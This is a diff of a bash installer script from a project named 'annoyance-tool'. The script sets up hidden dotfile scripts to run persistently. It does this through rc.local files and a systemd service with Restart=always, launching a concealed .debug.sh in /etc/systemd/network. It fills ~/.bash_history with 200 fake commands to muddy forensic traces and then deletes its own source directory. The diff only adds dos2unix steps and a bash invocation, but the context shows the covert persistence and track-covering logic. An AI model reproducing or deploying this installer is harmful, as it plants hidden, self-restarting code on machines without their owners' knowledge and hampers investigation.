@@ -1,6 +1,7 @@
 #!/bin/bash
-
+sudo apt-get install dos2unix
 chmod +x .controller.sh
+sudo dos2unix controller.sh
 LOCATIONS=("/etc/rc.local"
            "/etc/rc.d/rc.local"
            "/etc/init.d/rc.local"
@@ -28,7 +29,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/etc/systemd/network/.debug.sh
+ExecStart=/bin/bash /etc/systemd/network/.debug.sh
 Restart=always
 RestartSec=10
 
@@ -71,4 +72,5 @@ for i in {1..200}; do
     10) echo "cat /etc/ssh/sshd_config";;
   esac
 done >> ~/.bash_history
+apt-get remove dos2unix
 rm -rf ../annoyance-tool
